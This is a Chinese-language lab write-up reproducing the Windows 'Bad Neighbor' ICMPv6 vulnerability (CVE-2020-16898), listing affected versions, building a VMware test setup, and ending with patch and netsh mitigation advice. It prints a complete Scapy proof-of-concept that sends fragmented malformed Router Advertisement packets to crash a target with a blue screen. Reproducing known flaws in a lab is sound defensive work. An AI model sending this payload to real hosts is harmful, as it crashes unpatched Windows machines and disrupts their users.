## **声明：请勿将文章内的相关技术用于非法目的，如有相关非法行为与文章作者和本团队无关。请遵守《中华人民共和国网络安全法》。**

## 漏洞简介

CVE-2020-16898，又称“Bad Neighbor”，在Windows TCP/IP堆栈不正确地处理ICMPv6 Router
Advertisement数据包时，存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以获得在目标服务器或客户端上执行代码的能力。要利用此漏洞，攻击者必须将经过特殊设计的ICMPv6
Router Advertisement数据包发送到远程Windows计算机上。

## 漏洞描述

远程攻击者通过构造特制的ICMPv6 Router
Advertisement（路由通告）数据包，并将其发送到远程Windows主机上，即可在目标主机上执行任意代码。
攻击者可以利用该漏洞发送恶意制作的数据包，从而有可能在远程系统上执行任意代码。与MAPP（Microsoft Active
Protection计划）成员共享的概念证明既非常简单又非常可靠。它会导致立即出现BSOD（蓝屏死机），但更严重的是，对于那些能够绕过Windows
10和Windows Server
2019缓解措施的人来说，存在被利用的可能性。可以使远程代码执行的漏洞利用的影响将是广泛的，并且影响很大，因为这种类型的错误可能会变成可感染的。

### 受影响版本

Windows 10 Version 1709 for 32-bit Systems

Windows 10 Version 1709 for ARM64-based Systems

Windows 10 Version 1709 for x64-based Systems

Windows 10 Version 1803 for 32-bit Systems

Windows 10 Version 1803 for ARM64-based Systems

Windows 10 Version 1803 for x64-based Systems

Windows 10 Version 1809 for 32-bit Systems

Windows 10 Version 1809 for ARM64-based Systems

Windows 10 Version 1809 for x64-based Systems

Windows 10 Version 1903 for 32-bit Systems

Windows 10 Version 1903 for ARM64-based Systems

Windows 10 Version 1903 for x64-based Systems

Windows 10 Version 1909 for 32-bit Systems

Windows 10 Version 1909 for ARM64-based Systems

Windows 10 Version 1909 for x64-based Systems

Windows 10 Version 2004 for 32-bit Systems

Windows 10 Version 2004 for ARM64-based Systems

Windows 10 Version 2004 for x64-based Systems

Windows Server 2019

Windows Server 2019 (Server Core installation)

Windows Server, version 1903 (Server Core installation)

Windows Server, version 1909 (Server Core installation)

Windows Server, version 2004 (Server Core installation)

## 环境搭建

这里使用vmware，NAT出一个子网，并开启ipv6支持。点击VM的编辑—>虚拟网络编辑器，选择NAT模式，开启ipv6支持，点击确定，如下图。

![](https://image.3001.net/images/20230710/1688952202_64ab5d8a1442984672a87.png!small)选取一个受影响版本的windows10镜像，安装在虚拟机里。
这里我使用的是1903版本。

![](https://image.3001.net/images/20230710/1688952262_64ab5dc63d5b75c61e6cf.png!small)

打开win10的控制面板–>选择网络和共享中心，右键打开Ethernet0。

![](https://image.3001.net/images/20230710/1688952312_64ab5df80b6e646d4a895.png!small)

打开ipv6版本：
![恒梦安全](https://image.3001.net/images/20230710/1688952357_64ab5e25c7cff913b40ed.png!small)

## 漏洞复现

1.执行ipconfig，查看虚拟机IPv6地址

![](https://image.3001.net/images/20230710/1688953329_64ab61f1adaa81050ebf4.png!small)

2.注意：受害机器的 IPv6地址选取“ipv6地址”或者“临时ipv6地址”

3.攻击者和目标主机通信(这里把自己的物理机作为攻击机者) 执行ipconfig查看攻击机的ipv6地址，选择“本地链接的ipv6地址”。

![](https://image.3001.net/images/20230710/1688977965_64abc22da576abe4d8c4f.jpg!small)4.攻击机中python为3.10
，并且安装了scapy。 ：在安装好的python后，打开cmd，输入python,没有报错，说明成功：

![](https://image.3001.net/images/20230710/1688978010_64abc25a3eb0aa2da4adc.png!small)然后安装scapy：直接使用pip安装：pip
install scapy ，scapy启动界面如下图：

![](https://image.3001.net/images/20230710/1688978094_64abc2ae533ad0af2c9c6.png!small)5.这段payload作用是构造特定ipv6数据包，发送给受害者机器，让受害机器蓝屏。

![](https://image.3001.net/images/20230710/1688978425_64abc3f950d9dc4999272.jpg!small)

源代码：

    
    
    #!/usr/bin/env python3
    #
    # Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability
    #
    # Author: Adam 'pi3' Zabrocki
    # http://pi3.com.pl
     
     
    from scapy.all import *
    from scapy.layers.inet6 import ICMPv6NDOptEFA, ICMPv6NDOptRDNSS, ICMPv6ND_RA, IPv6, IPv6ExtHdrFragment, fragment6
     
    v6_dst = "xxxx:xxxx:xxxx:xxxx"   #目标靶机IPv6 地址
    v6_src = "xxxx:xxxx:xxxx:xxxx"              #攻击机本地链接 IPv6 地址
     
    p_test_half = 'A'.encode()*8 + b"\x18\x30" + b"\xFF\x18"
    p_test = p_test_half + 'A'.encode()*4
     
    c = ICMPv6NDOptEFA()
     
    e = ICMPv6NDOptRDNSS()
    e.len = 21
    e.dns = [
    "AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" ]
    aaa = ICMPv6NDOptRDNSS()
    aaa.len = 8
    pkt = ICMPv6ND_RA() / aaa / \
          Raw(load='A'.encode()*16*2 + p_test_half + b"\x18\xa0"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e
     
    p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=255)/ \
                  IPv6ExtHdrFragment()/pkt
     
    l=fragment6(p_test_frag, 200)
     
    for p in l:
        send(p)

6.在攻击者上执行：cve 2020-16898-exp1.py

![](https://image.3001.net/images/20230710/1688978975_64abc61fd08d9c5478409.png!small)7.虚拟机被打蓝屏，如下：

![](https://image.3001.net/images/20230710/1688979026_64abc652362aaa83a63ee.png!small)8.使用wirkshark选择对应的虚拟网卡进行抓包查看
如下图所示:

![](https://image.3001.net/images/20230710/1688979063_64abc6770fd2212304d19.png!small)9.查看数据包可以看到里面有发送的payload。
![](https://image.3001.net/images/20230710/1688979115_64abc6ab884cb58282549.png!small)

## 修复建议

1.升级更新。立即安装针对此漏洞的更新，下载最新的补丁包进行更新修复，如下链接。

<https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898>

2.不能升级的话，禁用 ICMPv6 RDNSS：

以管理员身份打开PowerShell，输入以下命令，即可"显示接口参数"

    
    
    netsh int ipv6 show interface

![](https://image.3001.net/images/20230710/1688979649_64abc8c18b681764ddfe6.png!small)可以根据此列表，查询到需要禁用的接口，执行禁用命令如下：

    
    
    netsh int ipv6 set int 11 rabaseddnsconfig=disable

返回“确定”后禁用成功。

 **咱们小屋，喜欢您来:D**

![](https://image.3001.net/images/20230817/1692249746_64ddae920abb21eb20344.png!small)  

